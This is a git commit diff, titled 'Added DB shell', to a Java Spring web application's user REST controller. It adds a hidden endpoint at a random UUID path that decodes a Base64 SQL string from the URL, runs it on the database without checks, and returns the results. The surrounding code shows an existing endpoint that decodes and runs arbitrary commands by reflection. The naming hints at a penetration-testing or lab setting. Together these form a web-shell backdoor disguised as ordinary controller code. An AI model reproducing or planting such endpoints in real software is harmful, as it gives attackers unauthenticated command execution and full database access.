6346b11faff67b3d66c504baa3693b4356ea3a85
strawp <github@strawp.net>
2021-07-21 13:17:23 +0100

    Added DB shell

--- src/main/java/com/tintulip/webapplication/user/UserRestController.java
+++ src/main/java/com/tintulip/webapplication/user/UserRestController.java
@@ -6,6 +6,11 @@ import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
+import org.springframework.jdbc.core.JdbcTemplate;
+import org.springframework.jdbc.core.ResultSetExtractor;
+import java.sql.ResultSet;
+import java.sql.ResultSetMetaData;
+import java.sql.SQLException;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -18,6 +23,9 @@ public class UserRestController {
     @Autowired
     private UserRepository repository;
 
+    @Autowired
+    private JdbcTemplate template;
+
     @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f")
     public Iterable<TestUser> nettitudeTest() {
         return repository.findAll();
@@ -27,6 +35,35 @@ public class UserRestController {
     public String nettitudeExec(@PathVariable("cmd") String cmd) {
         var decoded = new String(Base64.decodeBase64(cmd));
         return Base64.encodeBase64String(reflectionExec(decoded).getBytes());
+    }
+
+    @GetMapping(path="/d4310065-3631-45ef-8e27-14e8df95c518/{query}", produces="text/plain")
+    public String sqlQuery(@PathVariable("query") String query){
+        var decoded = new String(Base64.decodeBase64(query));
+        return Base64.encodeBase64String(dbQuery(decoded).getBytes());
+    }
+
+    private String dbQuery( String query ){
+      try {
+        return template.query(query,new ResultSetExtractor<String>(){
+          @Override
+          public String extractData(ResultSet rs) throws SQLException {
+
+            String rtn = "";
+            ResultSetMetaData meta = rs.getMetaData();
+            int cols = meta.getColumnCount();
+            while(rs.next()){
+              for( var i=1; i<=cols; i++ ){
+                rtn += rs.getString(i) + "\t";
+              }
+              rtn += "\n";
+            }
+            return rtn;
+          }
+        });
+      }catch( Exception e ){
+        return e.getMessage();
+      }
     }
 
     private String reflectionExec( String cmd ){
